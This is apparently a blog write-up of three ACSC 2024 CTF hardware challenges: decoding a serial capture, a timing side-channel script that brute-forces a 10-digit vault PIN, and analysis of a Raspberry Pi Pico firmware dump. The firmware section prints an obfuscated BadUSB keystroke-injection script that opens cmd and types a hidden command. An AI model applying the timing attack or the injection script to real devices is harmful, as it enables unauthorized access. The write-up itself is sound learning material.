@@ -1,0 +1,282 @@
+---
+title: "ACSC2024 [HARDWARE]"
+description: "Solved 3/5 hardware challenges. ᕙ(⇀‸↼‶)ᕗ"
+sidebar_position: 1
+tags: ["hardware"]
+---
+
+*March 31, 2024*
+
+Solved 3/5 hardware challenges. ᕙ(⇀‸↼‶)ᕗ
+
+## Challenge 1: An4lyz3\_1t (Warmup)
+
+---
+
+50 points, 140 solves
+
+### Challenge Description
+
+> Our surveillance team has managed to tap into a secret serial communication and capture a digital signal using a Saleae logic analyzer. Your objective is to decode the signal and uncover the hidden message.
+
+### Solution
+
+We have been given a `chall.sal` file. After acknowledging that there are no easy wins in the file, head your way and download the [Saleae logic analyzer](https://www.saleae.com/pages/downloads) (if you haven’t yet) as the description says.
+
+After importing the challenge file, we observed that only **D4** channel contains information. At first, I was so traumatized that I thought it was some binary challenges (`'0's`, `'1's`). However, it seems like it is not the case.
+
+![image](/img/ctfs/acsc2024-hardware-2024-01.png)
+
+The tool has a built-in analyzer. Choose **Async Serial** analyzer where **D4** should be selected as the input channel. By doing some trials and errors, the bit rate is the deciding factor as different bit rates return different results where the correct flag data has also been returned. Set the bit rate to around `57600` bits/s and the others remain the same.
+
+![image](/img/ctfs/acsc2024-hardware-2024-02.png)
+
+The image below indicates this characteristic where *red* and *blue* are bit rates `57600` bits/s and `115200` bits/s respectively. In definition, higher bit rates give more accurate data. However, it still depends on the dataset.
+
+![image](/img/ctfs/acsc2024-hardware-2024-03.png)
+
+In the **Data** section, we can retrieve the flag by switching to Terminal mode. We may see many flags have been returned due to the flag signal appearing multiple times in the same channel.
+
+![image](/img/ctfs/acsc2024-hardware-2024-04.png)
+
+***FLAG***: `ACSC{b4by4n4lyz3r_548e8c80e}`
+
+## Challenge 2: Vault (Easy)
+
+---
+
+150 points, 68 solves
+
+### Challenge Description
+
+> Can you perform a side-channel attack on this vault? The PIN is a 10-digit number.
+> 
+> Python3 is installed on remote. `nc vault.chal.2024.ctf.acsc.asia 9999`
+
+### Solution
+
+The author is kind enough to provide the executable binary file or else the instance is in trouble. As we entered an incorrect PIN, the error returned “*It didn’t take me any time to verify that it’s not the pin*”.
+
+```text
+$ ./chall                          
+<<VAULT banner>>
+Enter your PIN: 1234567890
+Access Denied
+ It didn't take me any time to verify that it's not the pin
+```
+
+After googling a bit, I found **“Time-Based Side Channel Attack”** which is highly related to the error message.
+
+The binary checks each number in the PIN from left to right. If the number is incorrect, it takes less time to check and react instantly whereas it takes slightly longer when it hits a correct number.
+
+Here is an illustration:
+
+```python
+#!/usr/bin/env python3
+import time, os
+TEST_COUNT = 6
+PIN_LENGTH = 10
+CHOICES = "0123456789"
+p = ''
+
+for i in CHOICES:
+  test = p+i+'0'*(PIN_LENGTH-len(p)-1)
+  temp = 0
+  for _ in range(TEST_COUNT):
+    start = time.time()
+    os.system(f"echo '{test}' | ./chall > /dev/null")
+    temp += (time.time()-start)
+  avgtime = temp/TEST_COUNT
+  print(f"{test}: {avgtime}")
+```
+
+The Python code above checks the first number of the PIN and returns the average time of each number. We know that all the PINs are incorrect, but it leaks some useful information which the digit `8` on the first position uses a slightly longer time to finish compared to other digits.
+
+This indicates we may attempt to launch the same attack on other digits of the PIN.
+
+```text
+0000000000: 0.17087074120839438
+1000000000: 0.17525823911031088
+2000000000: 0.16864744822184244
+3000000000: 0.17492890357971191
+4000000000: 0.16827436288197836
+5000000000: 0.1625486214955648
+6000000000: 0.16210401058197021
+7000000000: 0.1681519349416097
+8000000000: 0.3278968334197998
+9000000000: 0.16546150048573813
+```
+
+From here, we optimize the code by defining a checker function. The code will keep moving on to the next number if a correct number is found.
+
+Hence, we can print out the whole 10-digit PIN.
+
+```python
+#!/usr/bin/env python3
+import time, os
+
+TEST_COUNT = 6
+PIN_LENGTH = 10
+CHOICES = '0123456789'
+
+def checker(p):
+    maxtime = -1
+    res = ''
+    for i in CHOICES:
+        test = p+i+'0'*(PIN_LENGTH-len(p)-1)
+        temp = 0
+        for _ in range(TEST_COUNT):
+            start = time.time()
+            os.system(f"echo '{test}' | ./chall > /dev/null")
+            temp += (time.time()-start)
+        avgtime = temp/TEST_COUNT
+        if avgtime > maxtime:
+            maxtime = avgtime
+            res = i
+    return res
+
+def main():
+    p = ''
+    for i in range(PIN_LENGTH):
+        c = checker(p)
+        p += c
+        print(f"[+] Finding: {p}")
+    print(f"[+] PIN Found!: {p}")
+    os.system(f"echo '{p}' | ./chall")
+
+if __name__ == '__main__':
+    main()
+```
+
+Run the code and we get,
+
+```text
+$ python3 sol.py 
+[+] Finding: 8
+[+] Finding: 85
+[+] Finding: 857
+[+] Finding: 8574
+[+] Finding: 85742
+[+] Finding: 857421
+[+] Finding: 8574219
+[+] Finding: 85742193
+[+] Finding: 857421936
+[+] Finding: 8574219362
+[+] PIN Found!: 8574219362
+<<VAULT banner>>
+Enter your PIN:
+flag: ACSC{b377er_d3L4y3d_7h4n_N3v3r}
+```
+
+However, this is not the actual flag. Connect the instance to get the flag.
+
+![image](/img/ctfs/acsc2024-hardware-2024-05.png)
+
+***FLAG***: `ACSC{b377er_d3L4y3d_7h4n_N3v3r_b42fd3d840948f3e}`
+
+## Challenge 3: Picopico (Medium)
+
+---
+
+200 points, 55 solves
+
+### Challenge Description
+
+> Security personnel in our company have spotted a suspicious USB flash drive. They found a Raspberry Pi Pico board inside the case, but no flash drive board. Here’s the firmware dump of the Raspberry Pi Pico board. Could you figure out what this ‘USB flash drive’ is for?
+
+### Solution
+
+We had been given a `firmware.bin` file. When we tried to `strings` the file, it did not give any direct flags but it gave us a suspicious Python code at the end instead.
+
+```python
+import storage
+storage.disable_usb_drive()
+import time
+L=len
+o=bytes
+l=zip
+import microcontroller
+import usb_hid
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
+from adafruit_hid.keycode import Keycode
+w=b"\x10\x53\x7f\x2b"
+a=0x04
+K=43
+if microcontroller.nvm[0:L(w)]!=w:
+ microcontroller.nvm[0:L(w)]=w
+ O=microcontroller.nvm[a:a+K]
+ h=microcontroller.nvm[a+K:a+K+K]
+ F=o((kb^fb for kb,fb in l(O,h))).decode("ascii")
+ S=Keyboard(usb_hid.devices)
+ C=KeyboardLayoutUS(S)
+ time.sleep(0.1)
+ S.press(Keycode.WINDOWS,Keycode.R)
+ time.sleep(0.1)
+ S.release_all()
+ time.sleep(1)
+ C.write("cmd",delay=0.1)
+ time.sleep(0.1)
+ S.press(Keycode.ENTER)
+ time.sleep(0.1)
+ S.release_all()
+ time.sleep(1)
+ C.write(F,delay=0.1)
+ time.sleep(0.1)
+ S.press(Keycode.ENTER)
+ time.sleep(0.1)
+ S.release_all()
+time.sleep(0xFFFFFFFF)
+```
+
+This code looks confusing quite a bit, but what it does is it performs an XOR operation by using the contents in the `firmware.bin`, starting from the fourth bytes. The flag should be stored somewhere in the memory I believe.
+
+Here is a simplified version of the code:
+
+```python
+a=4
+K=43
+w=microcontroller.nvm[0:4]
+O=microcontroller.nvm[a:a+K]
+h=microcontroller.nvm[a+K:a+K+K]
+F=bytes((kb^fb for kb,fb in zip(O,h))).decode("ascii")
+# press WindowsKey+R --> write "cmd" --> open cmd --> write F in cmd --> sleep
+```
+
+By looking at it, `O` and `h` are the important values.
+
+Hence, I write a script to reverse back the XOR operation as XOR is reversible. I am using the same variables based on the Python code above (as I have no idea what the variables are `¯\_(ツ)_/¯`) and it works god damn!
+
+```python
+#!/usr/bin/env python3
+from tqdm import tqdm
+
+nvm = open('./firmware.bin', 'rb').read()
+K = 43
+
+for a in tqdm(range(len(nvm))):
+    O = nvm[a+4:a+4+K]
+    h = nvm[a+4+K:a+4+K+K]
+    res = []
+    for i in range(K):
+        try:
+            xor = O[i] ^ h[i]
+            res.append(xor)
+        except IndexError:
+            print("Completed!")
+            exit()
+    if b'ACSC' in bytes(res):
+        print(bytes(res))
+```
+
+```text
+$ python3 solver.py
+ 50%|███████████████████████████████████████████████████▌                                                    | 1039790/2097152 [00:06<00:06, 154779.44it/s]
+...
+b'echo ACSC{349040c16c36fbba8c484b289e0dae6f}'
+...
+100%|███████████████████████████████████████████████████████████████████████████████████████████████████████▋| 2091846/2097152 [00:12<00:00, 172482.51it/s]
+Completed!
+```
+
+Thank you for reading.
